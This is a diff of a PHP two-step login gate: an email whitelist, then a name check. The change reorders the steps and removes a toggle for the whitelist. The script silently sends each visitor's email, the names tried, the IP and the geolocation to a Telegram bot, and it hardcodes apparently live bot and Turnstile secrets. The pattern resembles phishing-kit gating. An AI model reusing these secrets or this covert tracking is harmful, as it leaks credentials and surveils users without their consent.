@@ -2,9 +2,6 @@
 session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
-// === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation
-
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
 $turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
@@ -24,8 +21,75 @@ if (file_exists(ATTEMPTS_FILE)) {
     if (is_array($data)) $attempts = $data;
 }
 
-// Step 1: Email submission
-if (isset($_POST['email'])) {
+// ----------------------
+// STEP 2: NAME SUBMISSION
+// ----------------------
+if (isset($_POST['name'])) {
+    $email = $_SESSION['old_email'] ?? '';
+    $name  = trim($_POST['name']);
+
+    if (!$email || !$name) {
+        $_SESSION['error_message'] = "Invalid input.";
+        header("Location: index.php"); exit;
+    }
+
+    $ip = get_client_ip();
+
+    // Location info
+    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
+    $location = ($geo && isset($geo['country']))
+        ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
+        : "Unknown";
+
+    // Update attempts
+    if (!isset($attempts[$email])) {
+        $attempts[$email] = [
+            'names'    => [$name],
+            'count'    => 1,
+            'ip'       => $ip,
+            'location' => $location
+        ];
+    } else {
+        $attempts[$email]['names'][] = $name;
+        $attempts[$email]['count']  += 1;
+        $attempts[$email]['ip']      = $ip;
+        $attempts[$email]['location']= $location;
+    }
+
+    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
+
+    // Telegram notification
+    $msg  = "Login attempt for $email\n";
+    $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
+    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
+    $msg .= "IP: $ip\n";
+    $msg .= "Location: $location";
+
+    @file_get_contents(
+        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
+        "?chat_id=$telegram_chat_id&text=".urlencode($msg)
+    );
+
+    // Correct name check
+    $correct_name = "John Doe";
+
+    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
+        header("Location: https://example.com/blocked"); exit;
+    } elseif ($name !== $correct_name) {
+        $_SESSION['error_message'] = "Incorrect name entered.";
+        header("Location: index.php"); exit;
+    }
+
+    // Success
+    unset($_SESSION['old_email'], $_SESSION['step']);
+    header("Location: dashboard.php"); exit;
+}
+
+// ----------------------
+// STEP 1: EMAIL SUBMISSION
+// only when we are on step 1
+// ----------------------
+if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] == 1)) {
     $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
     $turnstile_response = $_POST['cf-turnstile-response'] ?? '';
 
@@ -51,88 +115,20 @@ if (isset($_POST['email'])) {
         header("Location: index.php"); exit;
     }
 
-    // Validate email against whitelist (ONLY if enabled)
-    if ($EMAIL_VALIDATION_ENABLED) {
-        if (!file_exists($whitelist_file)) {
-            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
-            header("Location: index.php"); exit;
-        }
+    // Validate email against whitelist
+    $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $whitelist = array_map('trim', $whitelist);
 
-        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $whitelist = array_map('trim', $whitelist);
-
-        if (!in_array($email, $whitelist, true)) {
-            $_SESSION['error_message'] = "Email not allowed.";
-            header("Location: index.php"); exit;
-        }
+    if (!in_array($email, $whitelist)) {
+        $_SESSION['error_message'] = "Email not allowed.";
+        header("Location: index.php"); exit;
     }
 
-    // Email valid (or validation disabled), proceed to step 2
-    $_SESSION['step'] = 2;
+    // Email valid, proceed to step 2
+    $_SESSION['step']      = 2;
     $_SESSION['old_email'] = $email;
+
     header("Location: index.php"); exit;
-}
-
-// Step 2: Name submission
-if (isset($_POST['name'])) {
-    $email = $_SESSION['old_email'] ?? '';
-    $name  = trim($_POST['name']);
-
-    if (!$email || !$name) {
-        $_SESSION['error_message'] = "Invalid input.";
-        header("Location: index.php"); exit;
-    }
-
-    $ip = get_client_ip();
-
-    // Location info
-    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
-    $location = ($geo && isset($geo['country']))
-        ? ($geo['country'] . ", " . $geo['regionName'] . ", " . $geo['city'])
-        : "Unknown";
-
-    // Update attempts
-    if (!isset($attempts[$email])) {
-        $attempts[$email] = [
-            'names'    => [$name],
-            'count'    => 1,
-            'ip'       => $ip,
-            'location' => $location
-        ];
-    } else {
-        $attempts[$email]['names'][] = $name;
-        $attempts[$email]['count']  += 1;
-        $attempts[$email]['ip']      = $ip;
-        $attempts[$email]['location']= $location;
-    }
-
-    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
-
-    // Telegram notification
-    $msg  = "Login attempt for $email\n";
-    $msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
-    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
-    $msg .= "IP: $ip\n";
-    $msg .= "Location: $location";
-
-    @file_get_contents(
-        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
-        "?chat_id=$telegram_chat_id&text=" . urlencode($msg)
-    );
-
-    // Correct name check
-    $correct_name = "John Doe";
-
-    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
-        header("Location: https://example.com/blocked"); exit;
-    } elseif ($name !== $correct_name) {
-        $_SESSION['error_message'] = "Incorrect name entered.";
-        header("Location: index.php"); exit;
-    }
-
-    // Success
-    unset($_SESSION['old_email'], $_SESSION['step']);
-    header("Location: dashboard.php"); exit;
 }
 
 header("Location: index.php");
